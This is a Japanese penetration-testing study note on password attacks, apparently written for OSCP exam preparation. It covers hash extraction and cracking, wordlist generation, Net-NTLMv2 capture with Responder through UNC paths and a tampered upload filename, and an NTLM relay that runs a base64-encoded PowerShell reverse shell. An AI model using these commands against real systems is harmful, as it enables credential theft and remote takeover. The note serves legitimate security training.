- 関連ノート：
	- [[🐉THC-Hydra]]
	- [[🐈‍⬛Password Crack - JtR・Hashcat]]
	- [[💥AD認証システムの攻撃#Password Spray]]
	- [[コースの一般的な情報や特殊コマンド#⭐️28.2.6. パスワード攻撃について]]

---

# 総当たり・辞書攻撃

- [[🐉THC-Hydra]]などのツールを使用するまえに、まずはデフォルトクレデンシャルや、パスワードなしの認証を試す

---

# Password Crackingメソドロジー

- メソドロジー：
	1. Hashの抽出
	2. Hashのフォーマット化
	3. クラッキング所要時間の計算(ブルートフォースの場合)
	4. ワードリストの準備
	5. Hashの攻撃

## 1. Hashの抽出

### 実例：パスワードマネージャー

1. ターゲットのWindowsマシンが、どのパスワードマネージャーを使用しているか明らかにする
	- CLI：[[🔍Windows Local Enumeration#インストール済みアプリケーションの列挙]]
	- GUI：設定 > Apps > Apps & features

2. パスワードマネージャーのdbファイルを検索（ここではKeePassとする）
```powershell
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```
- それぞれのパスワードマネージャーのdbファイルの名称はググる

### 実例：SSHパスフレーズ

- SSHの秘密鍵で接続しようとすると、パスフレーズの入力を求められる
- `id_rsa`からHashを抽出し、クラックする
- ⚠️外部から入手した`id_rsa`ファイルには、読み・書き権限を付与すること
```zsh
chmod 600 id_rsa
```

## 2. Hashのフォーマット化

- まずはHashアルゴリズムを識別する必要がある：
	- [[🐈‍⬛Password Crack - JtR・Hashcat#Hashの識別]]

- sshパスフレーズ、zip、rar、/etc/shadowなど、必要に応じてフォーマットツールを使いフォーマット化する：
	- [[🐈‍⬛Password Crack - JtR・Hashcat#ハッシュ値の整形]]

## 3. クラッキング所要時間の計算

目的：
	限られた時間の中で、**総当たりの**クラッキングが終わりそうかを判断する。
	終わらないのであれば、==別の攻撃ベクターを模索する。==
		※辞書攻撃であれば実施不要

💡以下の手順をスキップして、Hashcatでクラッキングを走らせ、statusを表示する方法もある
![[Pasted image 20250720131350.png]]
$$所用推定時間$$
### 3-1. Key Space（※）を求める

- （※）指定可能な文字の組合せ数（文字の数^文字長）

1. 文字の数を算出
```zsh
# echo -n "[文字種(abcdefg等]" | wc -c
echo -n "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789" | wc -c
```
	↓
```zsh
62
```

2. Key Spaceの算出
```zsh
# python3 -c "print(文字の種類の数**文字長)"
python3 -c "print(62**5)"
```
	↓
```zsh
916132832
```

### 3-2. HWのハッシュクラックの性能を確認

- HWごとに結果は変わる
- Hashアルゴリズムごとに結果は変わる

- Hashcatのベンチマークモードでそれぞれのハッシュアルゴリズムが何MH/s（※）必要か確認
```zsh
hashcat -b
```
	 ↓
```zsh
hashcat (v6.2.5) starting in benchmark mode
...
* Device #1: pthread-Intel(R) Core(TM) i9-10885H CPU @ 2.40GHz, 1545/3154 MB (512 MB allocatable), 4MCU

Benchmark relevant options:
===========================
* --optimized-kernel-enable

-------------------
* Hash-Mode 0 (MD5)
-------------------

Speed.#1.........:   450.8 MH/s (2.19ms) @ Accel:256 Loops:1024 Thr:1 Vec:8

----------------------
* Hash-Mode 100 (SHA1)
----------------------

Speed.#1.........:   298.3 MH/s (3.22ms) @ Accel:256 Loops:1024 Thr:1 Vec:8

---------------------------
* Hash-Mode 1400 (SHA2-256)
---------------------------

Speed.#1.........:   134.2 MH/s (7.63ms) @ Accel:256 Loops:1024 Thr:1 Vec:8
```
- （※）1 MH/s = 1,000,000 ハッシュ / 秒

### 3-3. 所要時間を計算する

- 基本シンタックス
	- 秒単位の結果が返る
```zsh
python3 -c "print([Key Space] / [MH/s])"
```

- 具体例：Hash-Mode 1400 (SHA2-256)
```zsh
python3 -c "print(916132832 / 134200000)"
6.826623189269746
```

#### 補足：文字長を大きくする vs 文字種を増やす

- 文字種を増やすより、文字長を大きくするほうが、パスワードのパターンが指数関数的に増加するので、より安全

- ① 文字の種類を増やす（複雑にする）場合
	- たとえば、8文字のパスワードで：
	- 英小文字（26種類）だけなら：26⁸ ≈ 2×10¹¹通り
	- 英大文字・数字・記号も入れて94種類なら：94⁸ ≈ 6×10¹⁵通り
→文字の種類を68増やしても、29,000倍しかパターンが増えない

- ^ ② 長さを大きくする（例：8文字→10文字）
	- 94種類の文字を使うとして：
	- 8文字：94⁸ ≈ 6×10¹⁵通り
	- 10文字：94¹⁰ ≈ 5×10¹⁹通り
→ 文字の長さを2つ大きくしただけで、約8,000倍も増加

---

## 4. ワードリストの準備

- 単純な辞書攻撃よりも、ルールベースの攻撃（wordlistの変形）を実施すべき
	- パスワードポリシー（例：8文字以上、記号含むなど）を調査する
	- 既知の漏洩パスワード（例：Have I Been Pwned など）を調べてリストに追加する
- 適切なワードリストを使うことがパスワードアタック成功の鍵

### 漏洩・デフォルトパスワードの使用

- Default Password：
	- スイッチやルーターなどの機器には、メーカー設定のデフォルトパスワードが存在する
	- 対象のソフトウェアやハードウェアに応じて、既知のデフォルトパスワードを試す

- Weak Password：
	- 長年収集されたパスワードを1つにまとめたワードリストが存在
	- 例：SecListsのパスワードリスト

- Leaked Password：
	- 攻撃や漏洩により公開・販売されたパスワードやハッシュのリスト
	- ハッシュのみの場合はクラッキングが必要

#### 🔗漏洩・デフォルトパスワード集リンク

- 漏洩パスワードの販売（合法）：[Scattered Secrets](https://scatteredsecrets.com/)
- [Default Passwords - CIRT.net](https://cirt.net/passwords?criteria=smartermail)
- [Default Passwords - Datarecovery.com](https://datarecovery.com/rd/default-passwords/)
- [Default Passwords - default password.info](https://default-password.info/)
- [SecLists/Passwords/Leaked-Databases](https://github.com/danielmiessler/SecLists/tree/master/Passwords/Leaked-Databases)

### ワードリストの連結

```zsh
cat file1.txt file2.txt > combined.txt
# 重複の削除
sort combined.txt | uniq -u > cleaned_list.txt
```

### ワードリストの改変

- [[🐈‍⬛Password Crack - JtR・Hashcat#ワードリストの改変 w/ Hashcat]]
- [[🐈‍⬛Password Crack - JtR・Hashcat#ワードリストの改変 w/ JtR]]

### ワードリストの生成

- *cewl*：企業のWebサイトやサービス名、従業員名などから単語を抽出しワードリストを生成
```zsh
cewl -w <output> -d 5 -m <最小値> https://<TargetIP>

# メールアドレスは抽出してemails.txtに、それ以外はcewl.txtに保存
cewl -e --email_file emails.txt -m 5 -w cewl.txt http://<TargetIP>
```
- `-d`：クローリングの深さのレベル
- `-m`：文字の長さの最小値

#### Usernameワードリストの生成

- 情報収集のフェーズで、ターゲット企業の従業員の名前などを集めることは必須
- 集めたターゲットの従業員名などからユーザー名を生成する
- [username_generater](https://github.com/shroudri/username_generator)を使う
```zsh
# wget https://raw.githubusercontent.com/shroudri/username_generator/refs/heads/main/username_generator.py
echo "Suzuki Taro" > users.lst
python3 username_generator.py -w users.lst
```
![[Pasted image 20230611195317.png | 500]]
$$username生成例$$

#### Keyspaceテクニック

- Keyspace: 文字、数字、記号など、パスワードや秘密情報に使用される可能性のあるすべての要素を含む可能性のある組み合わせ

- crunch：ワードリストを作成するためのツール
```zsh
crunch <min_char_length> <max_char_length> -t <文字セット> -o <output>
```
- 例：
```zsh
crunch 6 6 -t pass%% -o output.txt
```
	↓
```
pass00
pass01
pass02
pass03
```

| 記号     | 意味           |
| ------ | ------------ |
| `%`    | 数字（`0-9`）    |
| `@`    | 小文字（`a-z`）   |
| `,`    | 大文字（`A-Z`）   |
| その他の文字 | その文字自体が候補になる |

#### CUPP（Common User Password Profiler）

- 質問に答えてワードリストを生成
```zsh
python3 cupp.py -i
```

- 事前定義されたワードリストの取得
```zsh
python3 cupp.py -l
```

- alectdb(デフォルトユーザー名・パスワードのリスト）からの取得
```zsh
python3 cupp.py -a
```

---

## 5. Hashの攻撃

- パスワードが複雑でクラックできない場合は、PtHやrelay攻撃に展開する
	- [[#Password Hashを用いた攻撃]]

---
---

# Password Hashを用いた攻撃


- [ ] [[💥AD Exploit]]もしくは[[🔍 Credentials Harvesting]]もしくは[[💥Lateral Movement & Persistance in AD]]にまとめたほうがいい

- 前提知識：
	- [[用語#SAM]]
	- [[用語#NTLM周りの用語]]

## NTLM Hashのクラッキング

### シチュエーション

- Windows環境で<u>獲得したユーザーがlocal administratorグループに属するとき</u>
```powershell
whoami
```
```powershell
net user <username>
```
	↓
```
Local Group Memberships *Administrators
```

### NTLMハッシュの取得方法 w/ Mimikatz

[[🥝Mimikatz#認証情報の抽出]]

- NTLMハッシュを取得出来たら、[[#2. Hashのフォーマット化]]以降のメソドロジーでクラックする

---

## PtH

- [[#NTLM Hashのクラッキング]]がハッシュが複雑で成功しない場合、かつ、同じユーザー名、かつパスワードを使用するアカウントが存在するだろう場合に実施：
	[[💥Lateral Movement & Persistance in AD#PtH (Pass-the-Hash)]]

---

## Net-NTLMv2のクラッキング

- Net-NTLM認証フロー：[[2. Breaching Active Directory#NetNTLMの基本]]

### シチュエーション

- Windows環境で<u>獲得したユーザーが非特権アカウントであるとき</u>
```powershell
whoami
```
```powershell
net user <username>
```
	↓
```
Local Group Memberships [*Administrators以外]
```

 - シェルを獲得できずコード実行ができない場合でも、Windowsサーバーへファイルアップロードが可能なWebアプリケーションを発見したとき

- SMBサーバーにファイルアップロードが可能なとき
	- 参考：[Proving Grounds Practice write-up - Vault](https://medium.com/@Dpsypher/proving-grounds-practice-vault-158516460860)


### Net-NTLMv2クラッキング概要

- 権限が低く、MimikatzなどでパスワードやNTLMハッシュを抜くことができなくても、Net-NTLMv2認証プロトコルを悪用して、ハッシュを取得 → クラックし、パスワードを得る。

1. 攻撃者側で[*Responder*](https://github.com/lgandx/Responder)を用意する
	- SMB, HTTP, FTP, LLMNR, NBT-NS, MDNSなど、さまざまなプロトコルをサポート
	- 💡Skipping previously captured hash for...とある場合は、`/usr/share/responder/logs/`に記録された結果を確認するか、Responderに`-v`を追加
2. ターゲットにSMB接続などを実行させ、攻撃者のResponderに認証をさせる
3. 認証過程でNet-NTLMv2ハッシュが送られてくる
4. ハッシュをクラックする

### Net-NTLMv2クラッキング手順 w/SMB

1. 攻撃者側でResponderを用意する
```zsh
sudo responder -I <interface(tun0等)>
```

2. ターゲット上から攻撃者のResponderにNet-NTLMv2認証をさせる
- 方法A：ターゲットシェルを獲得し、ターゲット上から攻撃者上の存在しないSMB共有にアクセスさせる
```powershell
dir \\<AttackerIP>\hoge
```

・方法B : WebアプリでRFIの脆弱性を利用して、ターゲットから攻撃者上の存在しないSMB共有にアクセスさせる
```sh
http://example/page=//<AttackerIP>/share/hoge
```

- 方法C：Webアプリでファイルアップロードし、攻撃者上の存在しないSMB共有にアクセスさせる
	- ⚠️ファイルアップロード機能が==SMBを介して可能である場合に==成功する
	- Burp Suiteなどでfilenameパラメタを以下の値に変更してリクエストする
```
\\\\<AttackerIP>\hoge\hoge.txt
```
![[Pasted image 20250720111345.png]]
$$filenameパラメタの値を攻撃者のIPを指すUNCパスに変更$$

3. 攻撃者のResponderを確認し、ハッシュを取得したことを確認
	- ⚠️複数のNTLMv2 Hashをキャプチャすると思うが、クラック対象はどれでもいい（一番最初のでいい）

4. [[#Password Crackingメソドロジー]]の２以降へ

#### Responder のトラブルシューティング

- `Error starting UDP server on port 5355` もしくは `Error starting UDP server on port 5353`と表示されるのに、`netstat`で当該ポート番号が確認できない
	- →Kali を再起動してから再度 Responder を起動

---

## Net-NTLMv2のリレーアタック

### シチュエーション

- [[#Net-NTLMv2のクラッキング]]と同じシチュエーション、かつ、ハッシュが複雑でクラックできなかった場合
- 成功条件は、[[💥Lateral Movement & Persistance in AD#PtH成功条件]]を満たす、かつSMB singningが無効であること

### Net-NTLMv2リレーアタック手順

1. PowerShellのリバースシェルワンライナーを用意する：[[What is the shell#Base64化したPowerShellリバースシェルワンライナー]]

2. 攻撃者マシン上でntlmrelayxを起動
```zsh
impacket-ntlmrelayx --no-http-server -smb2support -t $TargetIP -c "powershell -enc <base64_encoded_payload>"
```
- 🚨`$TargetIP`に設定するIPは、リレー先のもの（リレー元ではない）

3. リバースシェルリスナーを用意
```zsh
sudo rlwrap nc -lvnp <port>
```

4. ターゲット上から攻撃者のResponderにNet-NTLMv2認証をさせる
	- 方法は[[#Net-NTLMv2クラッキング手順 w/SMB]]のステップ2参照

5. リバースシェル獲得！

---
---

# Windows Credential Guardの仕組みとその回避

- 💥[[🥝Mimikatz#Credential Guardを回避してパスワード窃取]]

## Windows Credential Guardの仕組み

### Credential Guardの前提知識

- [[用語#LSA]]

#### Virtualization-based Security (VBS) 概要

- VBSとは？  
    CPUが持つハードウェア仮想化機能を活用し、OS内に隔離された安全なメモリ領域を作成するソフトウェア技術
    
- 実装方法
    - MicrosoftのHyper-V（ハイパーバイザ）上で動作
    - Virtual Secure Mode（VSM）と呼ばれる機能を使い、特定のメモリ領域を分離・保護

#### VSM（Virtual Secure Mode）の仕組み

- Hyper-Vのパーティション機能の一部
- 主にメモリの分離を実施し、機密情報を通常のカーネルやSYSTEM権限でもアクセス不可能な領域に保存する

- Virtual Trust Levels (VTLs) ：VTLは「仮想的な特権レベル」で、0-15まである（レベルが高いほど権限が高い）
- 現在は以下の２つが使われている    
    - VTL0（Normal Mode）：通常のWindows環境（ユーザープロセスやカーネル含む）
    - VTL1（Secure Mode）：機密機能を担う隔離環境で、
        - VTL1内のユーザーモード＝*Isolated User-Mode (IUM)*
        - IUMプロセス＝Trusted Processes / Secure Processes / Trustlets（信頼されたプロセス）

#### セキュリティ機能と利用例

- VSMは以下のようなセキュリティ機能の基盤技術として使われる：
    - Device Guard
    - 仮想TPM（vTPM）
    - **Credential Guard**

- VSMの導入状況について
    - Windows 10 / Server 2016から搭載されたが当初はデフォルト無効だった
    - 現在のWindowsではデフォルトで有効（💡ただし、アップグレードしただけでは以前の設定が引き継がれる）。

### Credential Guard の動作と影響

- Credential Guardが有効な場合：
    - `LSASS.exe`（VTL0）とは別に、`LSAISO.exe`がVTL1のtrustletとして動作(互いにRPCでやり取り)
    - クレデンシャルは `LSAISO.exe` 側に保存される
    - そのため、Mimikatzなどのツールでは<u>LSASSから直接資格情報を取得できない</u>
    - (結果に、` * LSA Isolated Data: NtlmHash`と表示されるだけ)

- 保護範囲
    - ドメインユーザーなど**非**ローカルユーザーの認証情報を保護
    - ==ローカルアカウントではVSMが動作していないので、依然としてMimikatzで取得可能==

### 認証処理の概要とSSPの悪用

- Windows認証の主な仕組み
    - LSA
    - Winlogon（Windows最初のログイン画面で裏で動くプロセス）
    - SSPI（Security Support Provider Interface）

- SSPIの役割：  
    認証が必要なとき、LSAがSSPIを通じて適切なSSPを呼び出して認証処理を実施。（すべてのアプリケーション・サービスの認証に使われる）
    - 例：Kerberos SSP、NTLM SSP などがDLLとして組み込まれている。
    - SSPはセキュリティを担うDLL

- ==SSPは複数追加可能==
    - `AddSecurityPackage` APIを使う。
    - または以下のレジストリキーにSSP名を追記：  
	- `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa\Security Packages`

---
---

# Misc

## パスワード設定における人の脆弱性

- 特殊文字はキーボード左側にある、`!@#$%`が使われがち
	- [Research - The Washington Post](https://www.washingtonpost.com/national/health-science/you-added--or-1-to-your-password-thinking-this-made-it-strong-science-says-no/2017/09/08/0f244e2a-9260-11e7-89fa-bb822a46da5b_story.html)
- 大文字にする必要がある場合は、先頭文字を大文字にしがち
- 特殊文字は末尾にしがち
- パスワードのパターンはなかなか変わらない
	- 漏洩済みパスワードから少し改変しただけのものが使われている

## OSCP試験におけるPassword Attacks

- 試行に何分もかかる場合は...
	- ユーザー名：
	- そもそもパスワードアタックは適切な攻撃ベクターではない(数分で終わるように設計されている)
	- 適切なワードリストではない可能性がある
